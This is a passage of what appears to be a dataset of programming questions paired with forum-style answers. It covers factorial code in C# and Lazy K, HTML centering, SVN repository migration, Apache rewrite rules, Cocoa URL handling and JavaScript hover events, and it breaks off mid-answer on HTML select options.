(S(S(KS)K)(SII(S(S(KS)K)I))(S(S(KS)K))(S(SII)I(S(S(KS)K)I))))))))K)))))))\n (S(S(KS)K)(K(S(S(KS)K)))))))))(K(S(K(S(S(KS)K)))K))))(SII))II)\n\nFeatures:\n\nNo subtraction or conditionals\nPrints all factorials (if you wait long enough)\nUses a second layer of Church numerals to convert the Nth factorial to N! asterisks followed by a newline\nUses the Y combinator for recursion\n\nIn case you are interested in trying to understand it, here is the Scheme source code to run through the Lazier compiler:\n(lazy-def '(fac input)\n   '((Y (lambda (f n a) ((lambda (b) ((cons 10) ((b (cons 42)) (f (1+ n) b))))\n       (* a n)))) 1 1))\n\n(for suitable definitions of Y, cons, 1, 10, 42, 1+, and *).\nEDIT:\nLazy K Factorial in Decimal\n(10KB of gibberish or else I would paste it). For example, at the Unix prompt:\n\n    $ echo \"4\" | ./lazy facdec.lazy\n    24\n    $ echo \"5\" | ./lazy facdec.lazy\n    120\n\nRather slow for numbers above, say, 5.\nThe code is sort of bloated because we have to include library code for all of our own primitives (code written in Hazy, a lambda calculus interpreter and LC-to-Lazy K compiler written in Haskell)."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "C#: LINQ\n    public static int factorial(int n)\n    {\n        return (Enumerable.Range(1, n).Aggregate(1, (previous, value) => previous * value));\n    }"}
{"instruction": "What can be a practical solution to center vertically and horizontally content in HTML that works in Firefox, IE6 and IE7?\nSome details:\n\nI am looking for solution for the entire page.\nYou need to specify only width of the element to be centered. Height of the element is not known in design time.\nWhen minimizing window, scrolling should appear only when all white space is gone.\nIn other words, width of screen should be represented as:  \n\n\"leftSpace width=(screenWidth-widthOfCenteredElement)/2\"+\n\"centeredElement width=widthOfCenteredElement\"+\n\"rightSpace width=(screenWidth-widthOfCenteredElement)/2\"  \nAnd the same for the height:\n\"topSpace height=(screenHeight-heightOfCenteredElement)/2\"+\n\"centeredElement height=heightOfCenteredElement\"+\n\"bottomSpace height=(screenWidth-heightOfCenteredElement)/2\"\n\nBy practical I mean that use of tables is OK. I intend to use this layout mostly for special pages like login. So CSS purity is not so important here, while following standards is desirable for future compatibility.", "output": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\"\n\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n <title>Centering</title>\n <style type=\"text/css\" media=\"screen\">\n  body, html {height: 100%; padding: 0px; margin: 0px;}\n  #outer {width: 100%; height: 100%; overflow: visible; padding: 0px; margin: 0px;}\n  #middle {vertical-align: middle}\n  #centered {width: 280px; margin-left: auto; margin-right: auto; text-align:center;}\n </style> \n</head>\n<body>\n <table id=\"outer\" cellpadding=\"0\" cellspacing=\"0\">\n  <tr><td id=\"middle\">\n   <div id=\"centered\" style=\"border: 1px solid green;\">\n    Centered content\n   </div>\n  </td></tr>\n </table>\n</body>\n</html>\n\nSolution from community.contractwebdevelopment.com also is a good one. And if you know height of your content that needs to be centered seems to be better."}
{"instruction": "I am working on a winforms application using LINQ to SQL - and am building the app using a SQL Express instance on my workstation. The final installation of the project will be on a proper SQL Server 2005.  \nThe database has the same name, and all tables are identical but the hostname is different. \nThe only way I have found to make my app work from one machine to the next is to re-open the code in Visual Studio, delete all of the objects referring to the SQL express instance from my .mdbl, save the project, connect to the other server, drag all of the references back on, and rebuild the application for release once more.\nan answer here suggested that one can simply modify the app.config/web.config file - whih would work for asp.net, but this is a winforms application. What's the correct way of making LINQ to SQL apps use a new database without having to re-open the app in visual studio?", "output": "I believe you can store the connection information in an app.config file and retrieve it from there.  Here is a post about doing that with LINQ to SQL.  Once you deploy it to a production server, you can just edit the XML to change the data source."}
{"instruction": "Is it correct to link a static library (.lib) compiled with VS 2005 with a program which is compiled with VS 2008? Both library and my program are written in C++. This program is run on Windows Mobile 6 Professional emulator.\nThis seems to work, there are no linking errors. However the program crashes during startup because strange things happen inside the linked library. E.g. lib can return a vector of characters with size of big negative number.\nThere are no such problems when the program is compiled with VS 2005.\nWhat is even more strange the problem is only when using release configuration for the build. When compiling using debug configuration the problem doesn't occur.", "output": "It's not incorrect to link to an older library in the way you describe, but it doesn't surprise me you're seeing some odd behavior. Couple sanity checks:\n\nAre both files using the same versions of the same run-time libraries?\nIs your .EXE application \"seeing\" the same header files that the .LIB was built against? Make sure that the _WIN32_WINNT (etc.) macros are declared properly.\n\nAnd when you say .LIB, do you mean a true static library (mylib.lib) or an import library for a DLL (mylib.lib -> mylib.dll)?\nAnd what are the compile/link settings for your VS2008 executable project?"}
{"instruction": "And/or: do I need one?\nI've recently started using FogBugz for my hobby projects, and I'm very happy with things so far. Having read more about it, especially the evidence-based scheduling, I'd like to start using it for my PhD as well. (Heh; something tells me my supervisors won't be opening tickets for me, though.)\nLast night I stumbled onto TimePost, which looks like a tidy app that doesn't do much but could be a real bonus to logging my time in FogBugz effectively. I tried looking around for similar apps but came up a little empty-handed. Are there any other FogBugz clients that you've used and recommend for Mac OS X? Or are you happy with the web interface?", "output": "I'm happy with using the web interface. I've used Fluid to create a custom browser for it, and even gotten some help making a pretty icon."}
{"instruction": "Is it correct to link a static library (.lib) compiled with VS 2005 with a program which is compiled with VS 2008? Both library and my program are written in C++. This program is run on Windows Mobile 6 Professional emulator.\nThis seems to work, there are no linking errors. However the program crashes during startup because strange things happen inside the linked library. E.g. lib can return a vector of characters with size of big negative number.\nThere are no such problems when the program is compiled with VS 2005.\nWhat is even more strange the problem is only when using release configuration for the build. When compiling using debug configuration the problem doesn't occur.", "output": "VS2005 and VS2008 use different STL implementations. When the VS2005 code returns a vector, the object has memory layout different from what VS2008 expects. That should be the reason for the broken values you see in the returned date.\nAs a rule of thumb, you should always compile all C++ modules of a project with the same compiler and all settings/#defines equal.\nOne particular #define that causes similar behaviour is the SECURE_SCL #define of VS2008. Two modules compiled with different settings will create exactly your problems, because #defining SECURE_SCL introduces more member variables to various C++ library classes."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "The problem with most of the above is that they will run out of precision at about 25! (12! with 32 bit ints) or just overflow. Here's a c# implementation to break through these limits!\nclass Number\n{\n  public Number ()\n  {\n    m_number = \"0\";\n  }\n\n  public Number (string value)\n  {\n    m_number = value;\n  }\n\n  public int this [int column]\n  {\n    get\n    {\n      return column < m_number.Length ? m_number [m_number.Length - column - 1] - '0' : 0;\n    }\n  }\n\n  public static implicit operator Number (string rhs)\n  {\n    return new Number (rhs);\n  }\n\n  public static bool operator == (Number lhs, Number rhs)\n  {\n    return lhs.m_number == rhs.m_number;\n  }\n\n  public static bool operator != (Number lhs, Number rhs)\n  {\n    return lhs.m_number != rhs.m_number;\n  }\n\n  public override bool Equals (object obj)\n  {\n     return this == (Number) obj;\n  }\n\n  public override int GetHashCode ()\n  {\n    return m_number.GetHashCode ();\n  }\n\n  public static Number operator + (Number lhs, Number rhs)\n  {\n    StringBuilder\n      result = new StringBuilder (new string ('0', lhs.m_number.Length + rhs.m_number.Length));\n\n    int\n      carry = 0;\n\n    for (int i = 0 ; i < result.Length ; ++i)\n    {\n      int\n        sum = carry + lhs [i] + rhs [i],\n        units = sum % 10;\n\n      carry = sum / 10;\n\n      result [result.Length - i - 1] = (char) ('0' + units);\n    }\n\n    return TrimLeadingZeros (result);\n  }\n\n  public static Number operator * (Number lhs, Number rhs)\n  {\n    StringBuilder\n      result = new StringBuilder (new string ('0', lhs.m_number.Length + rhs.m_number.Length));\n\n    for (int multiplier_index = rhs.m_number.Length - 1 ; multiplier_index >= 0 ; --multiplier_index)\n    {\n      int\n        multiplier = rhs.m_number [multiplier_index] - '0',\n        column = result.Length - rhs.m_number.Length + multiplier_index;\n\n      for (int i = lhs.m_number.Length - 1 ; i >= 0 ; --i, --column)\n      {\n        int\n          product = (lhs.m_number [i] - '0') * multiplier,\n          units = product % 10,\n          tens = product / 10,\n          hundreds = 0,\n          unit_sum = result [column] - '0' + units;\n\n        if (unit_sum > 9)\n        {\n          unit_sum -= 10;\n          ++tens;\n        }\n\n        result [column] = (char) ('0' + unit_sum);\n\n        int\n          tens_sum = result [column - 1] - '0' + tens;\n\n        if (tens_sum > 9)\n        {\n          tens_sum -= 10;\n          ++hundreds;\n        }\n\n        result [column - 1] = (char) ('0' + tens_sum);\n\n        if (hundreds > 0)\n        {\n          int\n            hundreds_sum = result [column - 2] - '0' + hundreds;\n\n          result [column - 2] = (char) ('0' + hundreds_sum);\n        }\n      }\n    }\n\n    return TrimLeadingZeros (result);\n  }\n\n  public override string ToString ()\n  {\n    return m_number;\n  }\n\n  static string TrimLeadingZeros (StringBuilder number)\n  {\n    while (number [0] == '0' && number.Length > 1)\n    {\n      number.Remove (0, 1);\n    }\n\n    return number.ToString ();\n  }\n\n  string\n    m_number;\n}\n\nstatic void Main (string [] args)\n{\n  Number\n    a = new Number (\"1\"),\n    b = new Number (args [0]),\n    one = new Number (\"1\");\n\n  for (Number c = new Number (\"1\") ; c != b ; )\n  {\n    c = c + one;\n    a = a * c;\n  }\n\n  Console.WriteLine (string.Format (\"{0}! = {1}\", new object [] { b, a }));\n}\n\nFWIW: 10000! is over 35500 character long.\nSkizz"}
{"instruction": "I'm just about wrapped up on a project where I was using a commercial SVN provider to store the source code. The web host the customer ultimately picked includes a repository as part of the hosting package, so, now that the project is over, I'd like to relocate the repository to their web host and discontinue the commercial account.\nHow would I go about doing this?", "output": "Assuming you have the necessary privileges to run svnadmin, you need to use the dump and load commands."}
{"instruction": "I'm just about wrapped up on a project where I was using a commercial SVN provider to store the source code. The web host the customer ultimately picked includes a repository as part of the hosting package, so, now that the project is over, I'd like to relocate the repository to their web host and discontinue the commercial account.\nHow would I go about doing this?", "output": "The tool to do that would be \nsvnadmin dump\n\nBut for this to work, you need filesystem-access to the repository. And once you have that (and provided the repository is in FSFS format), you can just copy the repository to its new location (if it's in BDB format, dump/load is strongly recommended).\nIf you do not have filesystem access, you would have to ask your repository provider to provide the dump for you (and make them delete their repository - and hope they comply)"}
{"instruction": "I'm just about wrapped up on a project where I was using a commercial SVN provider to store the source code. The web host the customer ultimately picked includes a repository as part of the hosting package, so, now that the project is over, I'd like to relocate the repository to their web host and discontinue the commercial account.\nHow would I go about doing this?", "output": "You might find some help on migrating SVN repositories in Chapter 5. Repository Administration, Migrating a repository.\nThis approach requires access to svnadmin."}
{"instruction": "I'm just about wrapped up on a project where I was using a commercial SVN provider to store the source code. The web host the customer ultimately picked includes a repository as part of the hosting package, so, now that the project is over, I'd like to relocate the repository to their web host and discontinue the commercial account.\nHow would I go about doing this?", "output": "If you want to move the repository and keep history, you'll probably need filesystem access on both hosts.  The simplest solution, if your backend is FSFS (the default on recent versions), is to make a filesystem copy of the entire repository folder.\nIf you have a Berkley DB backend, if you're not sure of what your backend is, or if you're changing SVN version numbers, you're going to want to use svnadmin to dump your old repository and load it into your new repository.  Using svnadmin dump will give you a single file backup that you can copy to the new system.  Then you can create the new (empty) repository and use svnadmin load, which will essentially replay all the commits along with its metadata (author, timestamp, etc).\nYou can read more about the dump/load process here:\nhttp://svnbook.red-bean.com/en/1.8/svn.reposadmin.maint.html#svn.reposadmin.maint.migrate\nAlso, if you do svnadmin load, make sure you use the --force-uuid option, or otherwise people are going to have problems switching to the new repository.  Subversion uses a UUID to identify the repository internally, and it won't let you switch a working copy to a different repository.\nIf you don't have filesystem access, there may be other third party options out there (or you can write something) to help you migrate: essentially you'd have to use the svn log to replay each revision on the new repository, and then fix up the metadata afterwards.  You'll need the pre-revprop-change and post-revprop-change hook scripts in place to do this, which sort of assumes filesystem access, so YMMV.  Or, if you don't want to keep the history, you can use your working copy to import into the new repository.  But hopefully this isn't the case."}
{"instruction": "I'm just about wrapped up on a project where I was using a commercial SVN provider to store the source code. The web host the customer ultimately picked includes a repository as part of the hosting package, so, now that the project is over, I'd like to relocate the repository to their web host and discontinue the commercial account.\nHow would I go about doing this?", "output": "You can also use the svnadmin hotcopy command:\nsvnadmin hotcopy OLD_REPOS_PATH NEW_REPOS_PATH\n\nIt takes a full backup from repository, including all hooks, configuration files, etc.\nMore at SVN Book"}
{"instruction": "I'm just about wrapped up on a project where I was using a commercial SVN provider to store the source code. The web host the customer ultimately picked includes a repository as part of the hosting package, so, now that the project is over, I'd like to relocate the repository to their web host and discontinue the commercial account.\nHow would I go about doing this?", "output": "Excerpt from my Blog-Note-to-myself\nNow you can import a dump file e.g. if you are migrating between machines / subversion versions. e.g. if I had created a dump file from the source repository and load it into the new repository as shown below. \nCmdShell> svnadmin dump D:\\CoderZone2\\svn-repos > ReposDump.dmp\nCmdShell> svnadmin load D:\\CoderZone\\svn-repos < ReposDump.dmp"}
{"instruction": "Im trying to redirect requests for a wildcard domain to a sub-directory.\nie. something.blah.domain.com --> blah.domain.com/something\nI dont know how to get the subdomain name to use in the rewrite rule.\nFinal Solution:\nRewriteCond %{HTTP_HOST} !^blah\\.domain\\.com\nRewriteCond %{HTTP_HOST} ^([^.]+)\nRewriteRule ^(.*) /%1/$1 [L]\n\nOr as pointed out by pilif\nRewriteCond %{HTTP_HOST} ^([^.]+)\\.media\\.xnet\\.tk$", "output": "You should have a look at the URL Rewriting Guide from the apache documentation.\nThe following is untested, but it should to the trick:\nRewriteCond %{HTTP_HOST} ^([^.]+)\\.blah\\.domain\\.com$\nRewriteRule ^/(.*)$           http://blah.domain.com/%1/$1 [L,R] \n\nThis only works if the subdomain contains no dots. Otherwise, you'd have to alter the Regexp in RewriteCond to match any character which should still work due to the anchoring, but this certainly feels safer."}
{"instruction": "Im trying to redirect requests for a wildcard domain to a sub-directory.\nie. something.blah.domain.com --> blah.domain.com/something\nI dont know how to get the subdomain name to use in the rewrite rule.\nFinal Solution:\nRewriteCond %{HTTP_HOST} !^blah\\.domain\\.com\nRewriteCond %{HTTP_HOST} ^([^.]+)\nRewriteRule ^(.*) /%1/$1 [L]\n\nOr as pointed out by pilif\nRewriteCond %{HTTP_HOST} ^([^.]+)\\.media\\.xnet\\.tk$", "output": "Try this:\nRewriteCond %{HTTP_HOST} (.+)\\.blah\\.domain\\.com\nRewriteRule ^(.+)$ /%1/$1 [L]\n\n@pilif (see comment): Okay, that's true. I just copied a .htaccess that I use on one of my projects. Guess it has a slightly different approach :)"}
{"instruction": "How do you set your Cocoa application as the default web browser?\nI want to create an application that is launched by default when the user clicks on an HTTP or HTTPS link in other applications (Mail, iChat etc.).", "output": "There are four steps to making an app that can act as the default web browser. The first three steps allow your app to act as a role handler for the relevant URL schemes (HTTP and HTTPS) and the final step makes it the default role handler for those schemes.\n1) Add the URL schemes your app can handle to your application's info.plist file\nTo add support for http:// and https:// you'd need to add the following to your application's info.plist file. This tells the OS that your application is capable of handling HTTP and HTTP URLs.\n<key>CFBundleURLTypes</key>\n<array>\n    <dict>\n        <key>CFBundleURLName</key>\n        <string>http URL</string>\n        <key>CFBundleURLSchemes</key>\n        <array>\n            <string>http</string>\n        </array>\n    </dict>\n    <dict>\n        <key>CFBundleURLName</key>\n        <string>Secure http URL</string>\n        <key>CFBundleURLSchemes</key>\n        <array>\n            <string>https</string>\n        </array>\n    </dict>\n</array>\n\n2) Write an URL handler method\nThis method will be called by the OS when it wants to use your application to open a URL. It doesn't matter which object you add this method to, that'll be explicitly passed to the Event Manager in the next step. The URL handler method should look something like this:\n- (void)getUrl:(NSAppleEventDescriptor *)event \n    withReplyEvent:(NSAppleEventDescriptor *)replyEvent\n{\n  // Get the URL\n  NSString *urlStr = [[event paramDescriptorForKeyword:keyDirectObject] \n    stringValue];\n\n  //TODO: Your custom URL handling code here\n}\n\n3) Register the URL handler method\nNext, tell the event manager which object and method to call when it wants to use your app to load an URL. In the code here I'm passed self as the event handler, assuming that we're calling setEventHandler from the same object that defines the getUrl:withReplyEvent: method.\nYou should add this code somewhere in your application's initialisation code.\nNSAppleEventManager *em = [NSAppleEventManager sharedAppleEventManager];\n[em \n  setEventHandler:self \n  andSelector:@selector(getUrl:withReplyEvent:) \n  forEventClass:kInternetEventClass \n  andEventID:kAEGetURL];\n\nSome applications, including early versions of Adobe AIR, use the alternative WWW!/OURL AppleEvent to request that an application opens URLs, so to be compatible with those applications you should also add the following:\n[em\n  setEventHandler:self \n  andSelector:@selector(getUrl:withReplyEvent:) \n  forEventClass:'WWW!' \n  andEventID:'OURL'];\n\n4) Set your app as the default browser\nEverything we've done so far as told the OS that your application is a browser, now we need to make it the default browser.\nWe've got to use the Launch Services API to do this. In this case we're setting our app to be the default role handler for HTTP and HTTPS links:\nCFStringRef bundleID = (CFStringRef)[[NSBundle mainBundle] bundleIdentifier];\nOSStatus httpResult = LSSetDefaultHandlerForURLScheme(CFSTR(\"http\"), bundleID);\nOSStatus httpsResult = LSSetDefaultHandlerForURLScheme(CFSTR(\"https\"), bundleID);\n//TODO: Check httpResult and httpsResult for errors\n\n(It's probably best to ask the user's permission before changing their default browser.)\nCustom URL schemes\nIt's worth noting that you can also use these same steps to handle your own custom URL schemes. If you're creating a custom URL scheme it's a good idea to base it on your app's bundle identifier to avoid clashes with other apps. So if your bundle ID is com.example.MyApp you should consider using x-com-example-myapp:// URLs."}
{"instruction": "I'm using JavaScript to hide an image and show some text thats hidden under it. But, when the text is shown if you scroll over it, it fires the mouseout event on the container, that then hides the text and shows the image again, and it just goes into a weird loop.\nThe html looks like this:\n<div onmouseover=\"jsHoverIn('1')\" onmouseout=\"jsHoverOut('1')\">\n    <div style=\"\" id=\"image1\" />\n    <div id=\"text1\" style=\"display: none;\">\n        <p>some content</p>\n        <p>some more content</p>\n    </div>\n</div>\n\nAnd the javascript (It uses scriptaculous):\nfunction jsHoverIn (id)\n{\n    if ( !visible[id] )\n    {\n        new Effect.Fade (\"image\"+id, {queue: { position: 'end', scope: id } });\n        new Effect.Appear (\"text\"+id, {queue: { position: 'end', scope: id } });\n        visible[id] = true;\n    }\n}\nfunction jsHoverOut (id)\n{\n    var scope = Effect.Queues.get( id );\n    scope.each( function( effect ){ effect.cancel() } );\n\n    new Effect.Fade (\"text\"+id, {queue: { position: 'end', scope: id } });\n    new Effect.Appear (\"image\"+id, {queue: { position: 'end', scope: id } });\n    visible[id] = false;\n}\n\nThis seems really simple, but i just cant wrap my head around it.", "output": "This may not be the best solution but you could set a global boolean variable that would be accessible to both methods that would just specify if the last action was HoverIn or HoverOut. You could use this boolean variable to determine if the code should run or not. \nif (bWasHoverIn){\n   ...\n}"}
{"instruction": "I'm using JavaScript to hide an image and show some text thats hidden under it. But, when the text is shown if you scroll over it, it fires the mouseout event on the container, that then hides the text and shows the image again, and it just goes into a weird loop.\nThe html looks like this:\n<div onmouseover=\"jsHoverIn('1')\" onmouseout=\"jsHoverOut('1')\">\n    <div style=\"\" id=\"image1\" />\n    <div id=\"text1\" style=\"display: none;\">\n        <p>some content</p>\n        <p>some more content</p>\n    </div>\n</div>\n\nAnd the javascript (It uses scriptaculous):\nfunction jsHoverIn (id)\n{\n    if ( !visible[id] )\n    {\n        new Effect.Fade (\"image\"+id, {queue: { position: 'end', scope: id } });\n        new Effect.Appear (\"text\"+id, {queue: { position: 'end', scope: id } });\n        visible[id] = true;\n    }\n}\nfunction jsHoverOut (id)\n{\n    var scope = Effect.Queues.get( id );\n    scope.each( function( effect ){ effect.cancel() } );\n\n    new Effect.Fade (\"text\"+id, {queue: { position: 'end', scope: id } });\n    new Effect.Appear (\"image\"+id, {queue: { position: 'end', scope: id } });\n    visible[id] = false;\n}\n\nThis seems really simple, but i just cant wrap my head around it.", "output": "Shouldn't the onmouseover event be on the image div and the onmouseout event be on the text div?"}
{"instruction": "I'm using JavaScript to hide an image and show some text thats hidden under it. But, when the text is shown if you scroll over it, it fires the mouseout event on the container, that then hides the text and shows the image again, and it just goes into a weird loop.\nThe html looks like this:\n<div onmouseover=\"jsHoverIn('1')\" onmouseout=\"jsHoverOut('1')\">\n    <div style=\"\" id=\"image1\" />\n    <div id=\"text1\" style=\"display: none;\">\n        <p>some content</p>\n        <p>some more content</p>\n    </div>\n</div>\n\nAnd the javascript (It uses scriptaculous):\nfunction jsHoverIn (id)\n{\n    if ( !visible[id] )\n    {\n        new Effect.Fade (\"image\"+id, {queue: { position: 'end', scope: id } });\n        new Effect.Appear (\"text\"+id, {queue: { position: 'end', scope: id } });\n        visible[id] = true;\n    }\n}\nfunction jsHoverOut (id)\n{\n    var scope = Effect.Queues.get( id );\n    scope.each( function( effect ){ effect.cancel() } );\n\n    new Effect.Fade (\"text\"+id, {queue: { position: 'end', scope: id } });\n    new Effect.Appear (\"image\"+id, {queue: { position: 'end', scope: id } });\n    visible[id] = false;\n}\n\nThis seems really simple, but i just cant wrap my head around it.", "output": "@Ryan The boolean doesnt really help, it just avoids the loop, but the mouseover event is still fired and the text gets hiden.\n@Brian It used to be that way, but it behaved the same way."}
{"instruction": "For many years I have used two great tools BoundsChecker & Purify, but the developers of these applications have let me down, they no longer put effort into maintaining them or developing them. We have corporate accounts with both companies, and they both tell me that they have no intention of producing versions to support 64 bit applications.\nCan anyone recommend either open source or commercial alternatives that support 64 bit native C++/MFC applications?", "output": "I've used bounds checking and other dynamic analysis tools, and while the architectures are different it's the code that you're checking - in theory you could run bounds checking on any backend and the result would be the same - the code either steps outside its bounds or it does not.\nThe only complications are addressing more than 4GB of memory space, dealing with pieces of code you can't cross-compile to a 32-bit architecture (64 bit object files for which you have no source, etc), and general 64 bit migration issues (platform specific code such as checking for 0xFFFFFFFF instead of -1)\nWhat other problems are you running into doing bounds checking on your program?  Are you unable to compile a 32 bit version?\nIt's not your ideal solution, certainly, and one should always check the code they're going to run, but in this case you might not have a choice, unless you want to do your own bounds checking (which is a good idea in any case...)."}
{"instruction": "I'm using JavaScript to hide an image and show some text thats hidden under it. But, when the text is shown if you scroll over it, it fires the mouseout event on the container, that then hides the text and shows the image again, and it just goes into a weird loop.\nThe html looks like this:\n<div onmouseover=\"jsHoverIn('1')\" onmouseout=\"jsHoverOut('1')\">\n    <div style=\"\" id=\"image1\" />\n    <div id=\"text1\" style=\"display: none;\">\n        <p>some content</p>\n        <p>some more content</p>\n    </div>\n</div>\n\nAnd the javascript (It uses scriptaculous):\nfunction jsHoverIn (id)\n{\n    if ( !visible[id] )\n    {\n        new Effect.Fade (\"image\"+id, {queue: { position: 'end', scope: id } });\n        new Effect.Appear (\"text\"+id, {queue: { position: 'end', scope: id } });\n        visible[id] = true;\n    }\n}\nfunction jsHoverOut (id)\n{\n    var scope = Effect.Queues.get( id );\n    scope.each( function( effect ){ effect.cancel() } );\n\n    new Effect.Fade (\"text\"+id, {queue: { position: 'end', scope: id } });\n    new Effect.Appear (\"image\"+id, {queue: { position: 'end', scope: id } });\n    visible[id] = false;\n}\n\nThis seems really simple, but i just cant wrap my head around it.", "output": "I'd give the container div:\nposition: relative;\n\nand add a third div in the container (should be the last child of the container) with:\nposition: absolute;\ntop: 0;\nbottom: 0;\nleft: 0;\nright: 0;\n\nand catch the mouseover and mouseout events on this div instead.\nBecause it has no child elements, you shouldn't get spurious mouseover and mouseout events propagating to it.\nEdit:\nWhat I believe happens, is that when the cursor moves from a parent element onto a child element, a mouseout event occurs on the parent element, and a mouseover event occurs on the child element. However, if the mouseover handler on the child element does not catch the event and stop it propagating, the parent element will also receive the mouseover event."}
{"instruction": "I'm using JavaScript to hide an image and show some text thats hidden under it. But, when the text is shown if you scroll over it, it fires the mouseout event on the container, that then hides the text and shows the image again, and it just goes into a weird loop.\nThe html looks like this:\n<div onmouseover=\"jsHoverIn('1')\" onmouseout=\"jsHoverOut('1')\">\n    <div style=\"\" id=\"image1\" />\n    <div id=\"text1\" style=\"display: none;\">\n        <p>some content</p>\n        <p>some more content</p>\n    </div>\n</div>\n\nAnd the javascript (It uses scriptaculous):\nfunction jsHoverIn (id)\n{\n    if ( !visible[id] )\n    {\n        new Effect.Fade (\"image\"+id, {queue: { position: 'end', scope: id } });\n        new Effect.Appear (\"text\"+id, {queue: { position: 'end', scope: id } });\n        visible[id] = true;\n    }\n}\nfunction jsHoverOut (id)\n{\n    var scope = Effect.Queues.get( id );\n    scope.each( function( effect ){ effect.cancel() } );\n\n    new Effect.Fade (\"text\"+id, {queue: { position: 'end', scope: id } });\n    new Effect.Appear (\"image\"+id, {queue: { position: 'end', scope: id } });\n    visible[id] = false;\n}\n\nThis seems really simple, but i just cant wrap my head around it.", "output": "I'm not sure if this would fit with the rest of your styling, but perhaps if you changed the css on the text div so it was the same size as the image, or fixed the size of the outer div, then when the mouseover event fired, the size of the outer div wouldn't change so much as to cause the mouseout event.\nDoes this make sense?"}
{"instruction": "What can be a practical solution to center vertically and horizontally content in HTML that works in Firefox, IE6 and IE7?\nSome details:\n\nI am looking for solution for the entire page.\nYou need to specify only width of the element to be centered. Height of the element is not known in design time.\nWhen minimizing window, scrolling should appear only when all white space is gone.\nIn other words, width of screen should be represented as:  \n\n\"leftSpace width=(screenWidth-widthOfCenteredElement)/2\"+\n\"centeredElement width=widthOfCenteredElement\"+\n\"rightSpace width=(screenWidth-widthOfCenteredElement)/2\"  \nAnd the same for the height:\n\"topSpace height=(screenHeight-heightOfCenteredElement)/2\"+\n\"centeredElement height=heightOfCenteredElement\"+\n\"bottomSpace height=(screenWidth-heightOfCenteredElement)/2\"\n\nBy practical I mean that use of tables is OK. I intend to use this layout mostly for special pages like login. So CSS purity is not so important here, while following standards is desirable for future compatibility.", "output": "For horizontal:\n<style>\nbody\n{\n    text-align:left;\n}\n.MainBlockElement\n{\n    text-align:center;\n    margin: 0 auto;\n}\n</style>\n\nYou need the text-align:left in the body to fix a bug with IE's rendering."}
{"instruction": "In my specific example, I'm dealing with a drop-down, e.g.:\n<select name=\"foo\" id=\"bar\">\n    <option disabled=\"disabled\" selected=\"selected\">Select an item:</option>\n    <option>an item</option>\n    <option>another item</option>\n</select>\n\nOf course, that's pretty nonsensical, but I'm wondering whether any strict behaviour is defined. Opera effectively rejects the 'selected' attribute and selects the next item in the list. All other browsers appear to allow it, and it remains selected.\nUpdate: To clarify, I'm specifically interested in the initial selection. I'm dealing with one of those 'Select an item:'-type drop-downs, in which case the first option is really a label, and an action occurs onchange(). This is fairly well 'progressively enhanced', in that a submit button is present, and only removed via javascript. If the \"select...\" option were removed, whatever then were to become the first item would not be selectable. Are we just ruling out 'onchange' drop downs altogether, or should the \"select...\" option be selectable, just with no effect?", "output": "I do not think disabled is a standard attribute for the option element. Typically you disable the entire select menu, which is a cross-browser solution. If an element is not selectable, then it should not appear in the select menu.\nEdit: Wow, I was sure off on that one. I suppose it does pay to check the spec on occasion."}
{"instruction": "In my specific example, I'm dealing with a drop-down, e.g.:\n<select name=\"foo\" id=\"bar\">\n    <option disabled=\"disabled\" selected=\"selected\">Select an item:</option>\n    <option>an item</option>\n    <option>another item</option>\n</select>\n\nOf course, that's pretty nonsensical, but I'm wondering whether any strict behaviour is defined. Opera effectively rejects the 'selected' attribute and selects the next item in the list. All other browsers appear to allow it, and it remains selected.\nUpdate: To clarify, I'm specifically interested in the initial selection. I'm dealing with one of those 'Select an item:'-type drop-downs, in which case the first option is really a label, and an action occurs onchange(). This is fairly well 'progressively enhanced', in that a submit button is present, and only removed via javascript. If the \"select...\" option were removed, whatever then were to become the first item would not be selectable. Are we just ruling out 'onchange' drop downs altogether, or should the \"select...\" option be selectable, just with no effect?", "output": "The HTML specs are a bit vague (ie. completely lacking) with regard to this odd combination. They do say that a form element with the disabled attribute set should not be successful, so it really can't be selected.\nThe browser may well render it so that it looks selected, but it shouldn't show up in the POSTed data. Looks like Opera's got it right to me."}
{"instruction": "In my specific example, I'm dealing with a drop-down, e.g.:\n<select name=\"foo\" id=\"bar\">\n    <option disabled=\"disabled\" selected=\"selected\">Select an item:</option>\n    <option>an item</option>\n    <option>another item</option>\n</select>\n\nOf course, that's pretty nonsensical, but I'm wondering whether any strict behaviour is defined. Opera effectively rejects the 'selected' attribute and selects the next item in the list. All other browsers appear to allow it, and it remains selected.\nUpdate: To clarify, I'm specifically interested in the initial selection. I'm dealing with one of those 'Select an item:'-type drop-downs, in which case the first option is really a label, and an action occurs onchange(). This is fairly well 'progressively enhanced', in that a submit button is present, and only removed via javascript. If the \"select...\" option were removed, whatever then were to become the first item would not be selectable. Are we just ruling out 'onchange' drop downs altogether, or should the \"select...\" option be selectable, just with no effect?", "output": "The HTML specs state that both selected & disabled are available options for the <option> element, but doesn't specify what should happen in case of a conflict.  In the section on disabled controls it says\n\nWhen set, the disabled attribute has\n  the following effects on an element:\n\nDisabled controls do not 